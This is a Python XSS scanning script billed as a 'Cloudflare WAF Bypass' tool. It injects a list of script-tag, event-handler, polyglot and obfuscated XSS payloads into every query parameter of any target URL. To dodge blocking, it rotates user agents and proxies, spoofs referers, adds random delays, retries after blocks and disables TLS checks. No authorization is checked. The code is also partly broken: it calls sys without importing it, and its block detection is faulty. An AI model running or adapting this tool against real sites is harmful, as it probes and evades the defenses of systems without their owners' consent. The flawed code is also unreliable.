#!/usr/bin/env python3

import requests
import random
import time
import argparse
from fake_useragent import UserAgent
from urllib.parse import urlparse
from typing import List, Dict
import logging
import os
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# List of proxies (replace with real proxies or leave empty to disable)
PROXY_POOL = [
    # Example: 'http://123.45.67.89:8080',
    # Example: 'http://98.76.54.32:3128',
    # Add real proxies here or leave empty
]

# Default XSS payloads (updated with latest from X and other sources as of March 2025)
DEFAULT_XSS_PAYLOADS = [
    # From X posts
    "</script><script>alert(1234)</script>",  # From @shivangmauryaa, March 17, 2025
    "cv.pdf<img src=nothing onerror=alert('chux')>",  # From @chux13786509, March 7, 2025 (file upload XSS)
    
    # Classic and still effective payloads
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')",
    "'><script>alert('xss')</script>",
    
    # Modern payloads from PortSwigger 2024 Cheat Sheet and other sources
    "<svg onload=alert(1)>",  # Common SVG payload
    "<style>@keyframes x{}</style><xss style='animation-name:x' onanimationend=alert(1)>",  # Animation-based
    "<video><source onerror=alert(1)>",  # Media tag payload
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",  # Base64 encoded
    
    # Polyglot and bypass payloads
    "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",  # Polyglot from OWASP
    "<img src='x' onerror='window[\"al\"+\"ert\"](1)'>",  # Obfuscated alert
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",  # Char code bypass
]

# Cloudflare bypass headers
def get_random_headers() -> Dict[str, str]:
    ua = UserAgent()
    return {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'DNT': '1',  # Do Not Track
    }

# Randomize proxy selection
def get_random_proxy() -> Dict[str, str]:
    if not PROXY_POOL:
        logger.debug("No proxies available, proceeding without proxy.")
        return {}
    proxy = random.choice(PROXY_POOL)
    try:
        if not proxy.startswith(('http://', 'https://')) or ':' not in proxy:
            raise ValueError(f"Invalid proxy format: {proxy}")
        return {'http': proxy, 'https': proxy}
    except ValueError as e:
        logger.warning(f"Skipping invalid proxy: {e}")
        return {}

# Introduce random delay to avoid rate limiting
def random_delay(min_delay: float = 1.0, max_delay: float = 5.0) -> None:
    delay = random.uniform(min_delay, max_delay)
    logger.debug(f"Applying delay of {delay:.2f} seconds")
    time.sleep(delay)

# Check if response indicates Cloudflare block
def is_cloudflare_blocked(response: requests.Response) -> bool:
    if response.status_code == 403 and 'cloudflare' in response.text.lower():
        logger.debug("Cloudflare 403 block detected")
        return True
    if 'cf-ray' in response.headers or 'cf-cache-status' in response.headers:
        logger.debug("Cloudflare headers detected")
        return True
    return False

# Load payloads from a file
def load_payloads_from_file(file_path: str) -> List[str]:
    if not os.path.exists(file_path):
        logger.warning(f"Payload file '{file_path}' not found. Using only default payloads.")
        return []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            payloads = [line.strip() for line in f if line.strip()]
        if not payloads:
            logger.warning(f"Payload file '{file_path}' is empty. Using only default payloads.")
            return []
        logger.info(f"Loaded {len(payloads)} payloads from '{file_path}'")
        return payloads
    except Exception as e:
        logger.error(f"Failed to read payload file '{file_path}': {e}. Using only default payloads.")
        return []

# Write vulnerability to report file
def log_vulnerability_to_file(report_file: str, target_url: str, payload: str) -> None:
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    report_entry = f"[{timestamp}] Potential XSS Vulnerability\nTarget URL: {target_url}\nPayload: {payload}\n{'-'*50}\n"
    try:
        with open(report_file, 'a', encoding='utf-8') as f:
            f.write(report_entry)
        logger.debug(f"Logged vulnerability to {report_file}")
    except Exception as e:
        logger.error(f"Failed to write to report file '{report_file}': {e}")

# Main function to test XSS with Cloudflare bypass
def test_xss(target_url: str, payloads: List[str], timeout: int = 10, retries: int = 3, report_file: str = "xss_report.txt") -> None:
    parsed_url = urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = dict(param.split('=') for param in parsed_url.query.split('&')) if parsed_url.query else {}

    if not params:
        logger.warning("No query parameters found in URL. Testing may be limited.")

    for payload in payloads:
        attempt = 0
        while attempt < retries:
            try:
                # Randomize headers and proxy
                headers = get_random_headers()
                proxies = get_random_proxy()

                # Inject payload into parameters
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload

                logger.debug(f"Testing payload: {payload} with headers: {headers} and proxies: {proxies}")
                
                # Send request
                response = requests.get(
                    base_url,
                    params=test_params,
                    headers=headers,
                    proxies=proxies,
                    timeout=timeout,
                    verify=False  # Ignore SSL verification for testing
                )

                # Check response
                if is_cloudflare_blocked(response):
                    logger.warning(f"Cloudflare block detected for payload: {payload}. Retrying...")
                    attempt += 1
                    random_delay()
                    continue

                if payload in response.text:
                    logger.info(f"Potential XSS vulnerability found with payload: {payload}")
                    log_vulnerability_to_file(report_file, target_url, payload)  # Log to file

                else:
                    logger.debug(f"No XSS detected with payload: {payload} in response")

                break  # Exit retry loop on success

            except requests.RequestException as e:
                logger.error(f"Request failed: {e}")
                attempt += 1
                random_delay()
                if attempt == retries:
                    logger.error(f"Max retries reached for payload: {payload}")

            random_delay()  # Delay between requests

def main():
    parser = argparse.ArgumentParser(description="XSS Tester with Cloudflare WAF Bypass")
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('-r', '--retries', type=int, default=3, help='Number of retries on failure')
    parser.add_argument('-p', '--payload-file', default='xss_payloads.txt', help='Path to a text file containing XSS payloads (default: xss_payloads.txt)')
    args = parser.parse_args()

    # Load payloads from file (if it exists) and combine with default payloads
    file_payloads = load_payloads_from_file(args.payload_file)
    payloads = DEFAULT_XSS_PAYLOADS + file_payloads  # Combine default and file payloads
    logger.info(f"Using {len(payloads)} total payloads ({len(DEFAULT_XSS_PAYLOADS)} default + {len(file_payloads)} from file)")

    logger.info(f"Starting XSS test on {args.url}")
    test_xss(args.url, payloads, args.timeout, args.retries, report_file="xss_report.txt")
    logger.info("Test completed")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Script terminated by user")
        sys.exit(0)
